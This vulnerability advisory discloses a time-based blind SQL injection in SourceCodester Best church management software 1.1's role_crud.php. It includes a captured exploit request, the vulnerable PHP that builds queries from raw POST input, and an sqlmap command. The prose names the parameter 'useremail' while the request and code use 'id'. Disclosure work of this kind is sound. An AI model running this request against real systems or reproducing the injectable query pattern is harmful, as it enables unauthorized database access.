A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in `/admin/app/role_crud.php`. Affected is file `/admin/app/role_crud.php`,The manipulation of the argument useremail leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.

Request：
```
POST /admin/app/role_crud.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/index.php
Cookie: session=.eJwlzjsOwjAMANC7eGaoXX-SXgbZcSxYWzoh7k4R65veG-61z-MB22s_5w3uz4QNnCO1q44wx0xZOD2LcXpN61O0MQ5Hb1Y_1chO3AaGrEzFShiaJWMxrtDuacO8N0LTIMXupEp9yMXkwmF8qbgu4utaU-CKnMfc_xuEzxcNCS9C.Z6cWpg.lZDsI5G8bS-uZLspkr5BH3C8pZs; PHPSESSID=b6743umu710ukcu0d3rns2pt2b
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

update=1&id=*
```

Affect code(`/admin/app/role_crud.php`):
```
......
if (isset($_POST['update'])) {
      
      
     extract($_POST);
     $stmt = $conn->prepare("delete  from permission_role where group_id='".$_POST['id']."'");
    $stmt->execute();

    $stmt = $conn->prepare("UPDATE groups set name='$name',description='$description' where id='".$_POST['id']."'");
    $stmt->execute();

    $checkItem = $_POST["checkItem"];
    //print_r($_POST);
    $a = count($checkItem);  
    for($i=0;$i<$a;$i++){
    $id = $_POST['id'];

        $sql="insert into permission_role(permission_id,group_id)values('$checkItem[$i]','$id')";
        $execute = $conn->query($sql);
        
    }
    
        $_SESSION['update'] = "update";
        header("location:../manage_role.php");
}
......
```

Exploit:
```
python D:\Tools\sqlmap\sqlmap.py -r .\1.txt --dbs
```
![图片](https://github.com/user-attachments/assets/21d238f1-5481-41da-8d33-b0b544ae5f22)

![图片](https://github.com/user-attachments/assets/a1bf1402-95fc-45b4-aa7c-f3c36d1d6ae2)

